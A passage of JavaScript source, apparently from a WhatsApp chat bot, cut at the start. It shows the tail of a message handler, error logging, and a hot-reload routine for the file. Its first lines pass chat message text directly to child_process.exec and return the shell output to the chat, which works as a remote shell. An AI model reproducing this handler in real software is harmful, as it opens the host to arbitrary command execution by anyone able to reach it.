require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\